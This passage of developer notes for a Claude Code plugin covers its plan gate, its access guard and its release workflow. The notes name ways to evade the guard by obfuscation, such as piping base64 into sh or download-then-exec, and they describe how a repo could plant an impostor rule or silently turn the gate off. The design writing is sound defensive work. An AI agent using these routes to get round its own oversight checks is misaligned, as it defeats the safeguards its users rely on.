    the loop's status is the last failed test — **exit 1, with empty stdout and
    stderr**. Claude Code treats a non-zero, non-2 exit as a *non-blocking* error
    (only 2 blocks) and shows a `hook error` notice plus the first line of stderr:
    so the user got an unexplained error on every session start, every prompt and
    every gated tool call, while the plan gate and access guard sat inert and
    `ensure_deps` never ran — meaning not even a `bootstrap.log` to diagnose from.
    Skills and agents keep working (they're markdown), so the plugin looks *partly*
    alive, which is what makes it hard to diagnose.
  - **Exactly ONE registration echoes `NO_PYTHON_NOTICE`** (`git_check`, the first
    non-async SessionStart hook). SessionStart stdout becomes context, so that is
    what actually reaches the user; putting it on all eight would repeat it eight
    times. The constant lives in `setup_settings.py` and is mirrored into
    `plugin.json`, with `tests/test_setup_settings.py` asserting they agree and
    driving the real command string through a real shell with `PATH=""` (`command
    -v` and `echo` are builtins, so an empty PATH removes every interpreter without
    breaking the test).
  - **It cannot rescue the Windows Store stub case.** On a Windows box with no
    Python, the App Execution Aliases put a `python.exe`/`python3.exe` shim on
    PATH; `command -v` *succeeds*, and a failed `exec` exits the shell, so nothing
    after `done` runs. Untested — needs a clean Windows VM. If that shim ever exits
    0 on SessionStart/UserPromptSubmit, its "install from the Microsoft Store"
    message gets injected as if it were our rules block.
- **Plan gate rides native plan mode, and PROMPTS — never hard-blocks.** `PreToolUse`
  emits `ask` (not `deny`) for edits until approval is recorded for the session, so an
  unapproved session is nudged with a native approve dialog, never trapped. Approval is
  recorded on `PostToolUse` for ExitPlanMode (native plan approval) OR for the first
  completed write (the user approved the ask — gated on a `tool_response` so a declined
  ask never settles), so the prompt fires at most once per session. It used to `deny`,
  which on the VS Code build has no in-Claude override and pointed users at `clawness plan
  approve` — a CLI the plugin path doesn't install, stranding them; `ask` has a working
  Yes button, so that trap is gone. **Plan-file writes (`<config>/plans/`) are exempt**
  (`is_plan_file`) — gating them is a catch-22. Fails open on any error.
- **The gate has NO per-project off switch, and must never regain one (1.5.0).** It had
  two — `clawness plan off` (`plan_gate.enabled:false` in `<project>/.clawness/config.json`)
  and `clawness plan approve` (`status:approved` in `plan.json`, "until reset"). Both were
  permanent, silent, and project-local, and a plugin install doesn't ship the CLI that
  undoes them. This repo's own gate sat off for a month before anyone noticed, which is the
  one failure a process keeper cannot have: **an absent prompt is indistinguishable from a
  working one**, so nothing ever surfaces the mistake. Both are gone, along with
  `load_config`/`save_config`/`approve`/`reset`/`manually_approved` and `plan.json`.
  `gate_enabled` now reads only `CLAW_NO_PLAN_GATE` (dies with the shell) and
  `plan_gate.enabled:false` in `<config>/clawness/config.json` (global, so it can't be a
  thing you forgot about in one repo). It still takes `root` for call-site symmetry —
  don't "restore" a project lookup behind it. Only an explicit `false` disables; a corrupt
  or partial config leaves the gate ON, failing toward the prompt rather than toward
  silence. A stale pre-1.5.0 `config.json`/`plan.json` left in a project is inert by
  design and `tests/test_semantic_and_plan.py` pins that. The global config is registered
  as a guard control file (`_is_global_plan_config`) — it lives outside the project, so
  without that it would key on its parent DIRECTORY and one earlier approved write in
  `~/.claude/clawness/` would let a later write silently disable the gate. It's matched by
  exact path, not "a dir named clawness", because this repo's own checkout is one.
- **Headless and interactive read the SAME signal, `permission_mode` off the hook
  payload — there is no separate "are we headless" branch (1.5.0).** `claude -p` still
  plans: `--permission-mode plan` behaves exactly like Shift+Tab, clearing the gate on
  ExitPlanMode through the identical `record_session_approval` path. What changes is
  only the modes that mean "edit without asking me" were already chosen up front —
  `acceptEdits`/`auto`/`dontAsk`/`bypassPermissions` (`PREAUTHORIZED_MODES` in
  `plan.py`) — where re-asking isn't a second safeguard, it's the same question twice:
  interactively the harness auto-answers it before a human sees it, headlessly there is
  no human to answer it, so the only effect of asking anyway is stalling a run the user
  explicitly configured to be unattended. `default`/`plan` are live questions in both
  contexts and always gate. An unrecognized or missing `permission_mode` (older Claude
  Code build, unexpected value) falls through to asking — same fail-toward-prompt
  direction as the rest of the gate. Don't build a `--headless`/env-detection heuristic
  here: the harness already tells you the thing you'd be inferring.
- **Agent `model:` is split by task type, and the judgment agents must stay on
  `inherit`.** Subagent `model:` defaults to `inherit`, so pinning it is an ACTIVE
  override of the user's choice — until 1.4.0 all seven agents pinned `sonnet`, which
  meant an Opus user's `/clawness:audit` silently ran a tier below what they picked.
  `security-red-team`, `security-blue-team`, `arch-challenger` and `code-critic` now
  omit `model:` entirely; `test-writer`, `perf-auditor` and `refactor-advisor` keep
  `sonnet` (mechanical work, and `sonnet` is an alias so it won't rot). **Never
  hardcode `opus`/`fable` in a shipped agent** — a distributed plugin can't know the
  user's plan, access or budget, and forcing a frontier tier is the same error as the
  old downgrade pointed the other way. `effort:`/`maxTurns:` are unrelated and stay.
- **`.clawness/rules/` overrides by id, and the asymmetry with mandatory is
  deliberate (1.9.0).** `add_rules` used to be a pure append, so a project rule and
  the global rule it meant to override both entered the corpus and competed on
  lexical score — the stale global copy won a query naming the newer version, with no
  error and no warning. `_replace_by_id` now replaces a ranked rule in place
  (position preserved, so merge order can't perturb ranking). **Mandatory rules still
  append.** `.clawness/rules/` is project-local content — exactly the untrusted
  surface ENF-SEC-006 is about — so under replacement a cloned repo shipping
  `_mandatory/ENF-SEC-006.yml` would silently remove the real one from every turn.
  Appending leaves the genuine rule rendering next to a visible impostor. The feature
  that needed replacement is ranked version overrides, which this costs nothing.
- **Token efficiency:** mandatory rules render compact (id+RULE only); `CLAW_VERBOSE`
  / `CLAW_COMPACT` toggle. Keep the per-turn block lean.
- **Two install paths:** plugin (hooks declared in `plugin.json`, loaded from cache)
  vs manual (`install.sh`/`install.ps1` → editable `pip install` + `setup_settings.py`
  writes hooks to `settings.json`). The plugin path does NOT install the `clawness`
  CLI — plugin users verify via `/clawness:status`.
- **Naming:** package `clawness`, env vars `CLAW_*`, project dir `.clawness/`. (The
  `infinri/Writ` mentions in README and CHANGELOG are upstream credit / historical
  record — leave those. Everywhere else was renamed to Clawness; `install.ps1` keeps a
  `-WritDir` alias for back-compat only.)
- **The access guard is a harm-reduction tripwire, not a security boundary.** It is
  regex/heuristics over tool inputs the agent controls, so a determined adversary can
  obfuscate around it (`| base64 -d | sh`, download-then-exec, `python -c`, token
  munging). It exists to catch *honest mistakes and low-effort/​injected attacks* and
  to break approval-fatigue autopilot — not to sandbox a hostile agent. The real
  boundary is the deferred devcontainer + egress allowlist; keep that framing in the
  docs so users don't over-trust it. **Design rule: never nag normal dev work.**
  In-project secret reads and hardcoded/​endogenous values are allowed silently; only
  reaching for secrets *outside* the project, *sending* data to a host absent from the
  codebase, or editing the guard's own kill-switch files (`_is_control_file`) trips a
  prompt. When tightening detection, widen DENY conservatively (a false deny blocks
  real work) and prefer ASK.

## Dev workflow
- Test: `python -m pytest tests/` (set `CLAW_NO_PLAN_GATE=1` if the gate blocks your
  edits in this repo — but **unset it before running the suite**, since the plan-gate
  tests assert the gate is on and will fail with it disabled).
- Rules: `clawness lint` (rejects missing fields **and vague phrasing**),
  `clawness eval --floor-mrr 0.85 --floor-hit 0.95` (MRR@5/hit-rate; CI-gated),
  `clawness stats`, `clawness bench`.
- CI (`.github/workflows/ci.yml`) runs lint + tests + eval across ubuntu/macOS/windows × py3.10–3.14.

## Releasing
- **`marketplace.json` sets `"source": "./"`, so a push to `main` IS a release.** Users
  get whatever `main` holds on their next `claude plugin update` — the tag and GitHub
  release are markers for humans, not the delivery mechanism. Consequence: `main` must
  never sit ahead of the version it declares. Anything user-visible that lands there
  (rules, hooks, README, manifest copy) needs a version bump in the same push, or the
  work belongs on a branch until you're ready to release.
- **Every version in CHANGELOG.md gets exactly one tag and one GitHub release.** Don't
  leave an entry untagged, and don't stack several unreleased bumps — collapse the
  batch into one version instead. (v1.2.0 shipped that way: three features, one minor.)
- The sequence: bump the four version places → CHANGELOG entry → `pytest` + `clawness
  lint` + `clawness eval` → commit → `git tag -a vX.Y.Z` → push `main` and the tag →
  `gh release create vX.Y.Z --notes-file <extracted CHANGELOG entry>`. Verify with
  `git rev-list -n1 vX.Y.Z` against `origin/main` and
  `git show vX.Y.Z:clawness/__init__.py`.
- Publishing is outward-facing — confirm the release shape with the user before pushing
  a tag or creating a release.

## Gotchas
- **Always pass `encoding="utf-8"` on file I/O and stdin/stdout.** The corpus uses
  em-dashes/smart-quotes; bare `open()`/`read_text()`/`sys.stdin` default to cp1252
  on Windows and mangle them into mojibake (`—` → `â€"`) *at load time*. `clawness
  lint` now flags non-UTF-8 / U+FFFD rule files; keep new reads/writes UTF-8.
- **Keep retrieval a couple of ms** — no heavy imports or model loads in
  `claude_hook.py`/`core.py`. It was ~0.8ms at 121 rules, ~1.6ms at 195, and ~3ms at
  212 (after adding the `__ml__` concept group); the concept-expansion pass scales with
  both corpus size and `_CONCEPT_GROUPS`, so measure with `clawness bench` when adding either.
- **Version lives in 4 places** — bump `pyproject.toml`, `.claude-plugin/plugin.json`,
  `.claude-plugin/marketplace.json`, and `clawness/__init__.py` (`__version__`) together,
  and add a CHANGELOG entry. `tests/test_version.py` asserts all four agree + a CHANGELOG
  entry exists, so a drift fails CI.
- Rule YAML: `id, domain, severity, tags, triggers, when, rule, violation, correct`
  (concept terms must be single tokens; multi-word phrases never match).
- **`{{CURRENT_DATE}}`** in any rule field is replaced at render time with the live
  month + year (e.g. "June 2026") — see `_DATE_TOKEN`/`_current_date` in `core.py`.
  Substituted only on render, not in the search text, so retrieval stays
  date-independent. `ENF-CURRENT-001` uses it.
- Two things can't be tested from a sandbox: a real `pip install -e .` completing,
  and plugin hooks on a real Windows + python.org box. Smoke-test both before release.
  The access guard's decline path is now covered two ways so it's no longer a
  load-bearing manual check: `tests/test_access_guard_hook.py` drives the real hook at
  the dispatch level (PreToolUse records `pending`, PostToolUse confirms only WITH a
  `tool_response`), and the confirm additionally requires that execution evidence — so
  even if a build ever fired PostToolUse for a declined call, it wouldn't settle. A
  real-session decline click-test (ask → "no" → retry → must ask again) is still a nice
  final sanity check, but defense-in-depth no longer rests on it.
- **A guard write-test whose project root is a `mkdtemp()` dir proves nothing about the
  root check.** `_classify_write` exempts anything under `tempfile.gettempdir()`
  unconditionally, and `tests/test_guard.py::_project` builds its roots there — so the
  temp clause, not `_within(p, root)`, is what allows those writes. Measured: deleting
  `_within(p, root)` outright left all 88 guard tests green. Any test that means to
  exercise the project-root boundary (or the plan-file exemption, same `or` chain) must
  first point the temp exemption elsewhere — see
  `test_in_project_write_is_allowed_by_the_root_check_not_the_temp_exemption`.
- **Run any mutation/sabotage harness with `PYTHONDONTWRITEBYTECODE=1`.** The usual
  shape is: write a mutant into the real source → run pytest in a subprocess →
  restore. Two same-sized mutations in a row (renaming an env-var string, flipping a
  comparison) can land in one coarse mtime bucket, and CPython's `.pyc` validity check
  is (mtime, source size) — so the second run silently imports the *first* mutant's
  bytecode and the mutation is reported as **surviving**. Four mutants in the 1.6.0
  audit looked uncaught for exactly this reason and were killed on a clean re-run.
  This is a different failure from the false survivors mutmut itself reports (weak
  test selection); both mean the same thing — **apply the mutant by hand and confirm
  green before writing a test for it**.
- **Two mutants in the 1.6.0 audit are equivalent, not gaps. Don't re-chase them.**
  `rank_lessons`' `if top_k <= 0` (a `< 0` variant is unobservable — the downstream
  `[: top_k * 2]` and `[:top_k]` slices empty out at 0 anyway), and
  `tfidf_map.get(i, 0.0)`'s default (BM25 and TF-IDF run over the *same* tokenization
  and both slice to `top_k * 2`, so an index BM25 ranks is never absent from the
  TF-IDF map; the default is unreachable). Both were probed against real corpora
  before being classified.
- **When a source file carries two byte-identical guards, a positional
  `str.replace(old, new, 1)` mutates only the first.** `core.py`'s
  "build_index() must be called" check appears in both `_rank` and `retrieve`; a
  harness that mutates one and tests the other reports a false survivor. Mutate every
  copy, or anchor on surrounding context.
